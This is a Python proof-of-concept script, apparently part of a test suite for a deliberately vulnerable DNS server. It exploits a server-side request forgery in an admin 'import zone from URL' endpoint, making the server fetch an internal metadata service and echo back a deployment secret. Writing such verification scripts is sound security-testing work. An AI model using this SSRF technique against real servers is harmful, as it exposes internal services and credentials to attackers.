#!/usr/bin/env python3
"""
PoC #4: SSRF via the admin "import zone from URL" feature
---------------------------------------------------------
Bug: the admin endpoint GET/POST /admin/import?source_url=... fetches the
supplied URL with http_fetch() in dnsm.c and imports the result as zone data.
There is NO scheme/host allow-listing at all, so this ops feature (meant to
pull zone updates from a config-management server) will fetch any address the
DNS host can reach - including internal-only services the requesting client
cannot reach directly. Classic server-side request forgery.

How this proves it, purely over the wire: point source_url at the shared fleet
metadata service (`metadata:9000/secret/dns`, see ../../metadata-service) that
the attacker CANNOT reach directly (in the Docker compose it lives on a
`backend` network the poc container is not attached to). The admin server
fetches it on our behalf and echoes the metadata service's secret back in its
response - which is this deployment's real DNSM_FLAG value (the metadata
service reads it from the environment, the same place entrypoint.sh sources it;
see generate-secrets.sh). Retrieving that flag through DNSM proves the forgery,
against a genuine per-deployment secret rather than a value hardcoded in the
repo.

Run the server (with the metadata target reachable from it) then:
    python3 04_admin_ssrf.py [host] [admin_port] [metadata_url] [expected_flag]

If expected_flag is omitted, it is read from the DNSM_FLAG environment
variable, falling back to the repo's local-dev default.
"""
import os
import sys
import urllib.parse
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
ADMIN = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
INTERNAL_URL = sys.argv[3] if len(sys.argv) > 3 else "http://metadata:9000/secret/dns"
EXPECTED_FLAG = (sys.argv[4] if len(sys.argv) > 4
                  else os.environ.get("DNSM_FLAG", "FLAG{local-dev-default}"))
SECRET_HINT = "internal-secret"
# Credential the admin channel the normal way (per-deployment bearer token,
# minted by generate-secrets.sh; entrypoint.sh's local-dev default is
# "dev-admin-token"). Presenting it keeps this PoC testing the SSRF sink itself,
# independent of the fail-open admin gate (#8): fixing #8 must not flip this.
ADMIN_TOKEN = os.environ.get("DNSM_ADMIN_TOKEN", "dev-admin-token")


def reachable_directly(url):
    try:
        urllib.request.urlopen(url, timeout=3).read()
        return True
    except Exception:
        return False


def main():
    # Show the attacker cannot reach the internal target directly.
    if reachable_directly(INTERNAL_URL):
        print(f"[!] note: {INTERNAL_URL} is directly reachable from here; SSRF is still "
              f"demonstrated below, but network isolation would make it starker")
    else:
        print(f"[*] {INTERNAL_URL} is NOT directly reachable from the attacker - good")

    # Ask DNSM's admin to fetch the internal URL for us.
    ssrf = f"http://{HOST}:{ADMIN}/admin/import?source_url={urllib.parse.quote(INTERNAL_URL, safe='')}"
    try:
        req = urllib.request.Request(ssrf, headers={"X-Admin-Token": ADMIN_TOKEN})
        body = urllib.request.urlopen(req, timeout=8).read().decode(errors="replace")
    except Exception as e:
        print(f"[-] admin import request failed: {e}")
        return 1

    if EXPECTED_FLAG in body:
        leaked = [l for l in body.splitlines() if SECRET_HINT in l]
        leaked_line = leaked[0].strip() if leaked else "?"
        print(f"[+] SSRF confirmed: DNSM fetched the internal-only URL for us and leaked "
              f"this deployment's real secret {EXPECTED_FLAG!r} (line: {leaked_line!r})")
        return 0

    print(f"[-] expected flag {EXPECTED_FLAG!r} not present in admin response; SSRF may be "
          f"blocked, or DNSM_FLAG doesn't match the running deployment")
    print("    response was:", body[:200])
    return 1


if __name__ == "__main__":
    sys.exit(main())
